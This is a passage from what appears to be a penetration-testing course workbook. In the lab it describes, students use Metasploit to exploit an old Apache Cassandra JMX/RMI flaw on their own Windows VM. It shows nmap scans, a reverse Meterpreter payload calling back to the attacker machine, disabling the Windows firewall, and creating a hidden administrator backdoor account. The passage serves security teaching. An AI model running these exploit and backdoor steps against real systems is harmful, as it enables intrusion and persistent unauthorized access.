Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

If you can successfully ping your Windows host from Linux, you are ready to begin.

#### Lab – Step-by-Step Instructions

#### *1: Starting Apache Cassandra*

We're going to exploit an older version of Apache Cassandra. Up to version 2.1.3, Apache Cassandra created an unauthenticated RMI/JMX interface, which allows us to execute arbitrary Java code by submitting a malicious RMI request. You can read more about this vulnerability here .

Log into your Windows VM as the sec560 user with the password sec560.

On the Desktop, right click on the Terminal icon and select "Run as administrator"

![](SEC560_WorkBook1_page_157_Picture_5.jpeg)

Next, use tar to extract the Apache Cassandra to the C:\CourseFiles\ directory.

![](SEC560_WorkBook1_page_157_Figure_7.jpeg)

The last thing we need to do before switching to our Linux VM is to run Apache Cassandra.

C:\CourseFiles\apache-cassandra-2.1.3\bin\cassandra.bat -f

#### Expected Results

PS C:\Users\sec560>C:\CourseFiles\apache-cassandra-2.1.3\bin\cassandra.bat -f WARNING! Powershell script execution unavailable.

 Please use 'powershell Set-ExecutionPolicy Unrestricted' on this user-account to run cassandra with fully featured functionality on this platform.

Starting with legacy startup options

Starting Cassandra Server

INFO 05:17:21 Hostname: SEC560-Windows

INFO 05:17:21 Loading settings from file:/C:/CourseFiles/apache-cassandra-2.1.3/conf/ cassandra.yaml

... truncated for brevity ...

| INFO 05:17:28 system.peers            | 1,152 |
|---------------------------------------|-------|
| INFO 05:17:28 system.schema_keyspaces | 0,0   |
| INFO 05:17:28 system.schema_usertypes | 0,0   |
| INFO 05:17:28 system.local            | 0,0   |
| INFO 05:17:28 system.sstable_activity | 0,0   |
| INFO 05:17:28 system.schema_columns   | 0,0   |
| INFO 05:17:28 system.batchlog         | 0,0   |
| INFO 05:17:28 system_traces.sessions  | 0,0   |
| INFO 05:17:28 system_traces.events    | 0,0   |

Great! We're ready for pwnage! Leave this running and switch to your Linux VM, where we'll take a quick tour of Metasploit, and then ask Cassandra for a shell.

#### *2: Metasploit on Linux*

On our Linux virtual machine, let's get Metasploit up and running with the msfconsole command:

msfconsole

#### Expected Results

sec560@slingshot:~\$ msfconsole Running the 'init' command for the database: Existing database found, attempting to start it Starting database at /home/sec560/.msf4/db...success

... trimmed for brevity ...

msf >

Note that your command prompt is now the Metasploit Framework console prompt ( msf > ). The msf > prompt allows us to issue commands to Metasploit interactively. For instance, we can ask it to show all the exploit modules it has available with show exploits .

# Command show exploits Expected Results msf > show exploits Exploits ======== # NameDisclosure DateRankCheckDescription - ---- --------------- ---- ----- ----------- 0 exploit/aix/local/ibstat\_path 2013-09-24 excellent Yes ibstat \$PATH Privilege Escalation 1 exploit/aix/local/xorg\_x11\_server 2018-10-25 great Yes Xorg X11 Server Local Privilege Escalation 2 exploit/aix/rpc\_cmsd\_opcode21 2009-10-07 great No AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow ... trimmed for brevity ... 2551 exploit/windows/wins/ms04\_045\_wins 2004-12-14 great Yes MS04-045 Microsoft WINS Service Memory Overwrite

You can see there are over 2,500 exploits in Metasploit!

We're going to be exploiting Cassandra on Windows. Let's search for that exploit.

![](SEC560_WorkBook1_page_161_Figure_0.jpeg)

Unfortunately, there are no "exploits" specifically for Cassandra, only an auxiliary module. Remember at the beginning we said the vulnerability is a miscon figured RMI/JMX interface. Let's search "jmx" and specify that we want an exploit by specifying type:exploit :

| Command                                                                                                                                                                                                                                         |  |  |  |  |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--|--|--|--|
| search type:exploit<br>jmx                                                                                                                                                                                                                      |  |  |  |  |
| Expected Results                                                                                                                                                                                                                                |  |  |  |  |
| msf > search type:exploit jmx                                                                                                                                                                                                                   |  |  |  |  |
| Matching Modules<br>================                                                                                                                                                                                                            |  |  |  |  |
| Name<br>Disclosure Date<br>Rank<br>Check<br>#<br>Description<br><br><br>                                                                                                                                                                        |  |  |  |  |
| <br>0 exploit/multi/http/jboss_invoke_deploy<br>2007-02-20<br>excellent Yes<br>JBoss<br>DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)<br>1<br>\_ target: Automatic<br>2<br>\_ target: Java Universal<br>truncated for brevity |  |  |  |  |
| 25 exploit/multi/misc/java_jmx_server<br>2013-05-22<br>excellent Yes<br>Java                                                                                                                                                                    |  |  |  |  |
| JMX Server Insecure Configuration Java Code Execution<br>26 exploit/multi/misc/java_rmi_server<br>2011-10-15<br>excellent Yes<br>Java<br>RMI Server Insecure Default Configuration Java Code Execution                                          |  |  |  |  |
| truncated for brevity                                                                                                                                                                                                                           |  |  |  |  |
| Interact with a module by name or index. For example info 31, use 31 or use exploit/multi/<br>misc/java_rmi_server                                                                                                                              |  |  |  |  |
| After interacting with a module you can manually set a TARGET with set TARGET 'Mac OS X<br>x86 (Native Payload)'                                                                                                                                |  |  |  |  |

Wow! That's a lot! It's almost like Java has some system security issues...

Let's take a look at the details of exploit/multi/misc/java\_jmx\_server by entering info 25 , which will show us the information about the 25 th search result, which is indicated by the 25 to the left of the java\_jmx\_server module result.

| Command    |  |
|------------|--|
|            |  |
| 25<br>info |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |
|            |  |

### Expected Results msf > info 25 Name: Java JMX Server Insecure Configuration Java Code Execution Module: exploit/multi/misc/java\_jmx\_server Platform: Java Arch: java Privileged: No License: Metasploit Framework License (BSD) Rank: Excellent Disclosed: 2013-05-22 ...truncated for brevity... Available targets: Id Name -- ---- => 0 Generic (Java Payload) Check supported: Yes Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX\_PASSWORD no The password to interact with an authenticated JMX endpoint JMX\_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS yes The target host(s), see https://docs.metasploit.c om/docs/using-metasploit/basics/usingmetasploit.html RPORT yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload information: Avoid: 0 characters Description:

This module takes advantage a Java JMX interface insecure configuration, which would allow loading classes from any remote (HTTP) URL. JMX interfaces with authentication

disabled (com.sun.management.jmxremote.authenticate=false) should be vulnerable, while interfaces with authentication enabled will be vulnerable only if a weak configuration is deployed (allowing to use javax.management.loading.MLet, having a security manager allowing to load a ClassLoader MBean, etc.).

#### References:

https://docs.oracle.com/javase/8/docs/technotes/guides/jmx/JMX\_1\_4\_specification.pdf https://www.optiv.com/blog/exploiting-jmx-rmi https://nvd.nist.gov/vuln/detail/CVE-2015-2342

View the full module info with the info -d command.

First, notice that the exploit uses a Java payload and includes a "check" option. We'll discuss the payload in a later step. The "check" option is helpful because it allows us to check if a system is vulnerable without actually exploiting the vulnerability.

Next, let's read the description of the exploit to see if it will help us. The description normally provides a basic overview of the vulnerability and how the exploit takes advantage of it. We can see that the vulnerability allows us provide an arbitrary, remote HTTP address from which the service will retrieve and load a Java class.

In the "Basic Options" section above the description, we highlighted the required options for this exploit. Notice SRVHOST and SRVPORT have default settings. These are configured to have Metasploit set up an HTTP server listening on every interface ( 0.0.0.0 ) on tcp port 8080.

You'll notice we need to fill in RHOSTS and RPORT, however. Since you set up Apache Cassandra on your Windows VM, RHOSTS will be set to your Windows VM's IP address. But what about the RPORT? And if we didn't know it was there, how could we identify this vulnerability remotely?

In a new terminal, let's use Nmap to scan our Windows system to identify the port. Use the Ethernet0 IP address, not the tun0 address. The address you are looking for does NOT begin with 10.254.25X.X.

### The exact number of open ports you see may differ depending on when your Windows VM was last rebooted and how many and what labs you've run since then. The port we care about for this lab is 7199/tcp, as we'll explain next. Command sudo nmap--max-retries 0 -p- WINDOWS\_ETHERNET0\_ADDRESS Expected Results sec560@560vm:~\$ sudo nmap--max-retries 0 -p- 192.168.188.139 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 00:06 UTC Warning: 192.168.188.139 giving up on port because retransmission cap hit (0). Nmap scan report for 192.168.188.139 Host is up (0.00038s latency). Not shown: 33402 closed tcp ports (reset), 32117 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5040/tcp open unknown 5985/tcp open wsman 7199/tcp open unknown 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49670/tcp open unknown 49704/tcp open unknown 49705/tcp open unknown MAC Address: 00:0C:29:3A:B4:5C (VMware) Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds If the exact number of open ports you see differ...

Wow! That's a lot of ports! If you were to research the Apache Cassandra vulnerability, you'd learn the RMI server runs on TCP 7199 and some random high ports. Let's use Nmap to do a version scan of 7199 and run the Nmap RMI NSE scripts.

### Command sudo nmap--max-retries 0 -T5 -p7199 -sV --script rmi\* WINDOWS\_ETHERNET0\_ADDRESS Expected Results sec560@560vm:~\$ sudo nmap 192.168.188.139 --max-retries 0 -T5 -p7199 -sV --script rmi\* Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 00:07 UTC Nmap scan report for 192.168.188.139 Host is up (0.00035s latency). PORT STATE SERVICE VERSION 7199/tcp open java-rmi Java RMI | rmi-dumpregistry: | jmxrmi | implements javax.management.remote.rmi.RMIServer, | extends | java.lang.reflect.Proxy | fields | Ljava/lang/reflect/InvocationHandler; h | java.rmi.server.RemoteObjectInvocationHandler | @192.168.188.139:49704 | extends |\_ java.rmi.server.RemoteObject MAC Address: 00:0C:29:3A:B4:5C (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/ submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.39 seconds

We can see the RMI registry is running on port 7199, and in the example output points to 192.168.188.139:49704. The IP and port in your output will most likely be different, but it should match an open port from your previous Nmap scan, it does in our example.

# Review of previous Nmap output ...truncated for brevity... 49670/tcp open unknown 49704/tcp open unknown 49705/tcp open unknown MAC Address: 00:0C:29:3A:B4:5C (VMware) ...truncated for brevity...

Let's go back to our Metasploit terminal and select the exploit. We entered info 25 to get information about the exploit. We can enter use 25 to "use" the exploit, or provide the full path.

#### Command

use exploit/multi/misc/java\_jmx\_server

#### Expected Results

msf > use exploit/multi/misc/java\_jmx\_server

[\*] No payload configured, defaulting to java/meterpreter/reverse\_tcp msf exploit(multi/misc/java\_jmx\_server) >

#### Two things to notice:

- Metasploit automatically selected java/meterpreter/reverse\_tcp as our payload. 1.
- Our prompt changed from msf > to msf exploit(multi/misc/java\_jmx\_server) > , which helps us know where we are in the framework and what we're currently con figuring or using. 2.

Let's see what other payloads are available. There are over 1600 payloads in Metasploit, which can seem overwhelming; however, if we run show PAYLOADS in the context of an exploit, Metasploit will only show payloads compatible with that exploit.

### Command show payloads Expected Results msf exploit(multi/misc/java\_jmx\_server) > show payloads Compatible Payloads =================== # NameDisclosure DateRankCheckDescription - ---- --------------- ---- ----- ----------- 0 payload/cmd/unix/bind\_aws\_instance\_connect . normal No Unix SSH Shell, Bind Instance Connect (via AWS API) 1 payload/generic/custom . normal No Custom Payload 2 payload/generic/shell\_bind\_aws\_ssm . normal No Command Shell, Bind SSM (via AWS API) ...truncated for brevity.. 9 payload/java/meterpreter/reverse\_http . normal No Java Meterpreter, Java Reverse HTTP Stager 10 payload/java/meterpreter/reverse\_https . normal No Java Meterpreter, Java Reverse HTTPS Stager 11 payload/java/meterpreter/reverse\_tcp . normal No Java Meterpreter, Java Reverse TCP Stager ...truncated for brevity..

You can see, out of over 1600 possible payloads, Metasploit only returned around 16 compatible with the java\_jmx\_server exploit. Number 11 was set as the default payload, but let's change it from a reverse\_tcp payload to a reverse\_http payload. HTTP and HTTPS payloads are helpful if our C2 communication needs to traverse a web proxy.

# Command set PAYLOADjava/meterpreter/reverse\_http Expected Results msf exploit(multi/misc/java\_jmx\_server) > set PAYLOAD java/meterpreter/reverse\_http PAYLOAD => java/meterpreter/reverse\_http

Next, let's look at the options that are associated with this exploit:

|  | Command |
|--|---------|
|  |         |

show options

| Expected Results |  |
|------------------|--|
|                  |  |

msf exploit(multi/misc/java\_jmx\_server) > show options

Module options (exploit/multi/misc/java\_jmx\_server):

Name Current Setting Required Description

---- --------------- -------- -----------

JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX\_PASSWORD no The password to interact with an authenticated

JMX endpoint

JMX\_ROLE no The role to interact with an authenticated JMX

endpoint

RHOSTS yes The target host(s), see https://docs.metasploit.

com/docs/using-metasploit/basics/using-

metasploit.html

RPORT yes The target port (TCP)

SRVHOST 0.0.0.0 yes The local host or network interface to listen on.

This must be an address on the local machine or

0.0.0.0 to listen on all addresses.

SRVPORT 8080 yes The local port to listen on.

SSLCert no Path to a custom SSL certificate (default is

randomly generated)

URIPATH no The URI to use for this exploit (default is

random)

Payload options (java/meterpreter/reverse\_http):

Name Current Setting Required Description

---- --------------- -------- -----------

LHOST 192.168.188.140 yes The local listener hostname

LPORT 8080 yes The local listener port

LURI no The HTTP Path

Exploit target:

Id Name

-- ----

0 Generic (Java Payload)

View the full module info with the info, or info -d command.

The first option we'll set is the RHOSTS. This will be the IP address we want Metasploit to attack, which is your Windows Ethernet0 interface IP address. We'll also need to set the RPORT to 7199, which we discovered and scanned with Nmap a few moments ago.

When we set the new payload, it brought with it its own default settings, which creates a small problem. Do you see it? It's configured to use port 8080, but that is already set for SRVPORT. We can't use the same port for both settings, so let's change the LPORT back to 8443.

#### Command

set RHOSTS WINDOWS\_ETHERNET0\_ADDRESS set RPORT 7199 set LPORT 8443

#### Replace WINDOWS\_ETHERNET0\_ADDRESS!

Replace WINDOWS\_ETHERNET0\_ADDRESS with the local address of your Windows VM (NOT the address like 10.254.25X.X).

#### Expected Results

msf exploit(multi/misc/java\_jmx\_server) > set RHOSTS 192.168.188.139 RHOSTS => 192.168.188.139 msf exploit(multi/misc/java\_jmx\_server) > set RPORT 7199 RPORT => 7199 msf exploit(multi/misc/java\_jmx\_server) > set LPORT 8443 LPORT => 8443

We need to tell Metasploit where it should configure the Meterpreter reverse shell to connect to. We want it to connect back to our Linux machine's eth0 interface address.

Setting LHOST to the interface name, as shown below, is a shortcut that will use that interface's associated IP address. This is very helpful for automation, or other situations where your IP address might change regularly.

#### Command

set LHOST eth0

Metasploit is now con figured. Let's review our Metasploit configuration with show options.

### Command show options Expected Results msf exploit(multi/misc/java\_jmx\_server) > show options Module options (exploit/multi/misc/java\_jmx\_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX\_PASSWORD no The password to interact with an authenticated JMX endpoint JMX\_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.188.139 yes The target host(s), see https://docs.metasploit. com/docs/using-metasploit/basics/usingmetasploit.html RPORT 7199 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse\_http): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.188.140 yes The listen address (an interface may be specified) LPORT 8443 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload)

Let's run the check option for the exploit to see if the target is vulnerable.

View the full module info with the info, or info -d command.

check

#### Expected Results

msf exploit(multi/misc/java\_jmx\_server) > check [\*] 192.168.188.139:7199 - The target appears to be vulnerable.

Fantastic! Now on to pwnage!

#### *3: Launch the Attack*

Let's launch the attack! On your Linux machine, at the msf prompt, type exploit and press *Enter*:

If the exploit is successful, you should see a message on Linux saying "Meterpreter session X opened".

#### Command

exploit

#### Expected Results

msf exploit(multi/misc/java\_jmx\_server) > exploit

[\*] Started reverse TCP handler on 192.168.188.140:8443

[\*] 192.168.188.139:7199 - Using URL: http://192.168.188.140:8080/RKJtAmocU7sm

[\*] 192.168.188.139:7199 - Sending RMI Header...

[\*] 192.168.188.139:7199 - Discovering the JMXRMI endpoint...

[+] 192.168.188.139:7199 - JMXRMI endpoint on 192.168.188.139:49825

[\*] 192.168.188.139:7199 - Proceeding with handshake...

[+] 192.168.188.139:7199 - Handshake with JMX MBean server on 192.168.188.139:49825

[\*] 192.168.188.139:7199 - Loading payload...

[\*] 192.168.188.139:7199 - Replied to request for mlet

[\*] 192.168.188.139:7199 - Replied to request for payload JAR

[\*] 192.168.188.139:7199 - Executing payload...

[\*] Sending stage (58073 bytes) to 192.168.188.139

[\*] Meterpreter session 1 opened (192.168.188.140:8443 -> 192.168.188.139:50142) at 2025-09-17 17:09:56 +0000

[\*] 192.168.188.139:7199 - Server stopped.

#### meterpreter >

#### Session opened

If the exploit works and you see the prompt meterpreter > , please move to Step 4 below.

#### If no session is created (click to expand)

If it is not successful, keep in mind that when Metasploit exploits software, there is a chance that software could crash. Remember, most exploits have a certain probability of success, falling short of 100%. We chose to use the Cassandra exploit because it has a higher probability of success, but it may sometimes crash the program.

If you see a message on your Windows box that says Cassandra has crashed, simply rerun it. You can do this by pressing CTRL+C in the Windows terminal running Cassandra. Then rerun Cassandra by entering C:\CourseFiles\apachecassandra-2.1.3\bin\cassandra.bat -f in the Windows terminal, again.

If Cassandra did not crash but the exploit was unsuccessful, con firm that you have the correct LHOST IP address for your Linux system.

If Metasploit returned an error, check the settings that correspond with the error:

- [unreachable]: Rex::HostUnreachable : •
  - Check your RHOSTS setting is your Windows Ethernet0 IP address •
  - If the message says The connection with (10.254.252.4:19090) timed out and lists a lab VPN IP address similar to what you see here, make sure you are disconnected from the VPN. If you are disconnected and receive the error anyway, please reboot your Windows VM and try again from Step 1. •
- Exploit failed [unreachable]: Rex::ConnectionRefused : Ensure your RPORT is set to 7199. If it is set to 7199, use Nmap to verify the port is open with nmap -Pn -p7199 WINDOWS\_ETHERNET0\_ADDRESS •

If all of those settings look right, it's possible that the Windows firewall was accidentally re-enabled. Run netsh advfirewall set allprofiles state off inside an administrative terminal on your Windows box, then try again.

Then, try running the exploit command again in the Metasploit console.

#### *4: Sessions*

The prompt meterpreter > prompt shows you that you are in Meterpreter. If you want to take other actions in Metasploit, you first need to background the session by typing background or pressing CTRL+z.

Type background to go back to the Metasploit console.

# Your session number may differ. Command background Expected Results meterpreter > background [\*] Backgrounding session 1.. msf exploit(multi/misc/java\_jmx\_server) >

At the msf > prompt, we are now interacting with Metasploit, not with Meterpreter on the compromised host. Let's take a look at sessions .

![](SEC560_WorkBook1_page_175_Figure_2.jpeg)

In this case, you can see the session is 1 . Yours may be different.

The numbered sessions are convenient, but we may end up with multiple shells and the numbers could be di fficult to remember. We can rename the session to something more memorable. To rename the session we need to use -n newname and the current session number with -i ID .

# Your session ID may be a different number Command sessions -n cassandra\_win11 -i 1 sessions Expected Results msf exploit(multi/misc/java\_jmx\_server) > sessions -n cassandra\_win11 -i 1 [\*] Session 1 named to cassandra\_win11 msf exploit(multi/misc/java\_jmx\_server) > sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 cassandra\_win11 meterpreter java/windows sec560 @ SEC560-Windows 192.168.188.138:8443 -> 192.168.188.139:50142 (192.168.188.139) Session ID

Let's now interact with our session.

![](SEC560_WorkBook1_page_176_Figure_2.jpeg)

#### *5: Meterpreter*

As we move into Step 5 to interact with our Meterpreter session, let's review the architecture of what we are looking at. You are viewing your Meterpreter session on your Linux machine running Metasploit. That session is actually controlling your Windows machine, with the Meterpreter running inside of the Cassandra java.exe process.

With the Meterpreter running, let's explore the system a little bit. Run the following command:

#### Command

sysinfo

#### Expected Results

meterpreter > sysinfo

Computer : SEC560-WINDOWS

OS : Windows 11 (10.0 Build 26100).

Architecture : x64

System Language : en\_US Domain : WORKGROUP

Logged On Users : 2

Meterpreter : x86/windows

This shows us the operating system of the compromised machine.

Now, let's determine our username on the victim box:

#### Command

getuid

#### Expected Results

meterpreter > getuid

Server username: SEC560-WINDOWS\sec560

We should have the same username that you used to invoke the Apache Cassandra server because we are running from within its memory space.

Next, let's look at the processes running on the screen:

## Your process IDs will differ from that shown above. Command ps Expected Results meterpreter > ps Process List ============ PID Name User Path --- ---- ---- ---- 0 System Idle Process NT AUTHORITY\SYSTEM System Idle Process 4 System N/A System 128 Registry NT AUTHORITY\SYSTEM Registry 352 fontdrvhost.exe Font Driver Host\UMFD-1 fontdrvhost.exe 436 WindowsTerminal.exe SEC560-WINDOWS\sec560 WindowsTerminal.exe 460 smss.exe NT AUTHORITY\SYSTEM smss.exe 528 fontdrvhost.exe Font Driver Host\UMFD-0 fontdrvhost.exe 592 csrss.exe NT AUTHORITY\SYSTEM csrss.exe 696 wininit.exe NT AUTHORITY\SYSTEM wininit.exe 704 csrss.exe NT AUTHORITY\SYSTEM csrss.exe 744 svchost.exe NT AUTHORITY\SYSTEM svchost.exe 768 winlogon.exe NT AUTHORITY\SYSTEM winlogon.exe 844 services.exe NT AUTHORITY\SYSTEM services.exe 864 lsass.exe NT AUTHORITY\SYSTEM lsass.exe ... truncated for brevity ... Process IDs will differ

Let's take a look at options we have with the ps command by looking at the help.

# Command ps -h Expected Results meterpreter > ps -h Usage: ps [ options ] pattern Use the command with no arguments to see all running processes. The following options can be used to filter those results: OPTIONS: -A Filter on architecture -c Filter only child processes of the current shell -h Help menu. -S Filter on process name -s Filter only SYSTEM processes -U Filter on user name -x Filter for exact matches rather than regex

Let's find Cassandra's java.exe process using -S .

![](SEC560_WorkBook1_page_179_Figure_2.jpeg)

We don't know which one our shell is in, but we can find out with getpid :

# Command getpid Expected Results meterpreter > getpid Current pid: 10396

And finally, let's look at the Meterpreter commands we have available:

# Command help

Now let's explore some commands we have for interacting with the file system. First, we will navigate to the c:\ directory. Since Meterpreter tends to use Linux/Unix style notation, the backslash character ( \ ) used as a delimiter between folders is problematic. You have three options to work around this issue:

- Use a forward slash ( / ) to refer to directory paths 1.
- Use an escape sequence of a backslash to indicate a backslash ( \\ ) 2.
- Wrap the entire path in single quotes, where backslashes don't need to be escaped 3.

So, to change to the c:\ directory, please run:

# Command cd 'c:\'

Note that within the Meterpreter, you can also refer to c:\ as / . So the commands cd c:\\ and cd / do the same thing.

Next, let's find out where we are in the directory structure. The particular command depends on the version of the Meterpreter you are running. As in Linux, the command is pwd.

# Command pwd Expected Results meterpreter > pwd c:\

Now let's get a directory listing:

![](SEC560_WorkBook1_page_181_Figure_2.jpeg)

#### *6: Shell*

Sometimes what we want to do on a target is easier completed with a simple Windows shell, such as cmd.exe, than from within the Meterpreter. To support that kind of access, the Meterpreter includes the shell command, which executes a cmd.exe. You can see this convenient feature by executing the shell command from within the Meterpreter prompt:

shell

#### Expected Results

meterpreter > shell

Process 7968 created.

Channel 1 created.

Microsoft Windows [Version 10.0.26100.1301]

(c) Microsoft Corporation. All rights reserved.

c:\>

#### If you receive an error (click to expand)

If the shell command did not work for you, you can alternatively use the execute command to run a program. Let's run a cmd.exe command shell. We'll invoke it "channelized" with the -c option, which means that the Meterpreter will keep a communication session open with the executed program so that we can interact with it.

#### Command

execute -f cmd.exe-c -H

#### Expected Results

meterpreter > execute -f cmd.exe -c -H Process 4292 created.

Channel 2 created.

meterpreter >

#### Notes

First, note the channel #. You'll use that momentarily

Second, note that the cmd.exe window appeared on the Windows GUI while it was running. To make the program run in a hidden mode, the execute command can be run with a -H option for "hidden".

If the execution of the program is successful, the Meterpreter will tell us its process ID and the channel number we can use to interact with the process's Standard Input and Standard Output. We can perform such interaction using the interact with the channel number, or channel -i N and the channel number as follows.

channel -i N

#### Expected Results

meterpreter > channel -i 2 Interacting with channel 2...

Microsoft Windows [Version 10.0.26100.1301]

(c) Microsoft Corporation. All rights reserved.

c:\>

The N should be replaced with the channel number (not the process ID) you saw in the output of the execute command.

You can now type whatever commands you would like inside of the cmd.exe.

You can now type whatever commands you would like inside of the cmd.exe.

Run hostname.

#### Command

hostname

#### Expected Results

c:\> hostname hostname

SEC560-Windows

Run ipconfig .

ipconfig

#### Expected Results

c:\> ipconfig ipconfig

Windows IP Configuration

Unknown adapter OpenVPN Data Channel Offload:

Connection-specific DNS Suffix . :

Link-local IPv6 Address . . . . . : fe80::b88d:53d1:3cce:5ae4%6

IPv4 Address. . . . . . . . . . . : 10.254.252.2 Subnet Mask . . . . . . . . . . . : 255.255.254.0

Default Gateway . . . . . . . . . :

Unknown adapter OpenVPN Wintun:

Media State . . . . . . . . . . . : Media disconnected

Connection-specific DNS Suffix . :

Ethernet adapter Ethernet0:

Connection-specific DNS Suffix . : localdomain

Link-local IPv6 Address . . . . . : fe80::dc2a:6612:843e:eac0%4

IPv4 Address. . . . . . . . . . . : 10.10.10.165 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 10.10.10.2

Unknown adapter OpenVPN TAP-Windows6:

Media State . . . . . . . . . . . : Media disconnected

Connection-specific DNS Suffix . :

Run dir .

dir

#### Expected Results

c:\> dir dir Volume in drive C is Windows Volume Serial Number is BE08-62CA

#### Directory of c:\

08/13/2024 02:18 PM <DIR> bin 08/13/2024 02:12 PM <DIR> CourseFiles 08/12/2024 07:26 PM <DIR> inetpub 04/01/2024 12:26 AM <DIR> PerfLogs 08/13/2024 02:07 PM <DIR> Program Files 08/13/2024 02:07 PM <DIR> Program Files (x86) 08/12/2024 07:23 PM <DIR> Python311 08/12/2024 07:59 PM <DIR> tmp 08/13/2024 02:01 PM <DIR> Users 08/13/2024 02:07 PM <DIR> Windows 0 File(s) 0 bytes

10 Dir(s) 52,628,938,752 bytes free

Let's now look at the users on the system.

#### Command

net user

#### Expected Results

c:\> net user net user

User accounts for \\SEC560-WINDOWS

-------------------------------------------------------------------------------

Administrator DefaultAccount Guest

notadmin sec560 WDAGUtilityAccount

The command completed successfully.

Create a backdoor account named BACKDOOR.

#### Command

net user BACKDOOR Password1 /add

#### Expected Results

c:\> net user BACKDOOR Password1 /add net user BACKDOOR Password1 /add The command completed successfully.

The above command creates a user with a password of Password1.

Let's now confirm the user exists.

net user BACKDOOR

#### Expected Results

c:\> net user BACKDOOR net user BACKDOOR

User name BACKDOOR

Full Name Comment

User's comment

Country/region code 000 (System Default)

Account active Yes Account expires Never

Password last set 8/14/2024 4:21:39 PM

Password expires Never

Password changeable 8/14/2024 4:21:39 PM

Password required Yes User may change password Yes

Workstations allowed All

Logon script User profile Home directory

Last logon Never

Logon hours allowed All

Local Group Memberships \*Users Global Group memberships \*None The command completed successfully.

The new BACKDOOR account is a regular account. It would be more useful if it has administrative permissions. Let's make this account an administrator.

net localgroup administrators BACKDOOR /add

#### Expected Results

C:\> net localgroup administrators BACKDOOR /add net localgroup administrators BACKDOOR /add The command completed successfully.

Now, take a look at the members of the administrators group to confirm the backdoor account is an administrator.

#### Command

net localgroup administrators

#### Expected Results

c:\> net localgroup administrators net localgroup administrators Alias name administrators

Comment Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------

Administrator

BACKDOOR

sec560

The command completed successfully.

As we can see, our new account is an administrator!

Let's remove the account.

# Command net user BACKDOOR /del Expected Results C:\> net user BACKDOOR /del net user BACKDOOR /del The command completed successfully.

We can confirm the deletion by running net user again. For the sake of space, the output isn't included here.

To exit your shell, simply type exit , and you should be back to the meterpreter > prompt:

# Command exit Expected Results C:\> exit meterpreter >

#### *7: More Meterpreter Features*

Next, grab a screenshot of the exploited system and save it as /home/sec560/screenshot.jpg :

# Command screenshot -p /home/sec560/screenshot.jpg Expected Results meterpreter > screenshot -p /home/sec560/screenshot.jpg Screenshot saved to: /home/sec560/screenshot.jpg

Meterpreter will take the screenshot, which may take a few moments.

Next, launch a folder window by clicking the sec560's Home shortcut on the Linux VM's desktop. Double-click on the screenshot.jpg file.

You should see your screenshot, showing the console of the Windows VM.

![](SEC560_WorkBook1_page_191_Figure_2.jpeg)

#### *8: Upgrading Meterpreter & Migrating Processes*

There are limitations to using the Java Meterpreter payload. For example, some of the more advanced features, such as migrate , are not implemented in the Java Meterpreter payload. If you were to try to run migrate -h to see the migrate help information, it will tell you it's not supported. That's because it depends on the privs module, which isn't supported either. Entering load privs to try to force it would produce an error, too.

#### Java Meterpreter Error

meterpreter > migrate -h

[-] The "migrate" command is not supported by this Meterpreter type (java/windows) meterpreter > load priv

Loading extension priv...

[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (java/windows)

- [-] The "priv" extension is supported by the following Meterpreter payloads:
- [-] windows/x64/meterpreter\*
- [-] windows/meterpreter\*

Let's send this session to the background.

#### Command

background

#### Expected Results

meterpreter > background

[\*] Backgrounding session cassandra\_win11... msf exploit(multi/misc/java\_jmx\_server) >

To use those features, we'll need to upgrade our Java Meterpreter to a regular Meterpreter shell. There is a post-exploitation module to do that for us called post/windows/manage/shell\_to\_meterpreter. We could enter use and the module name, configure all of the details, and then run it; however, the sessions command includes a -u option to "upgrade" a shell. It runs the same post exploitation modules, but it's way easier to remember and type.

Before we can upgrade our shell, we have to handle a bug in the current Meterpreter payload. The most recent version of Metasploit added the unhook module as an auto loaded module, which is the source of the bug. Along with stdapi and privs . We're going to set a global MSF environment variable to prevent that from happening. Then we can upgrade our shell.

setg AutoLoadExtensions stdapi,priv sessions -u 1

#### Expected Results

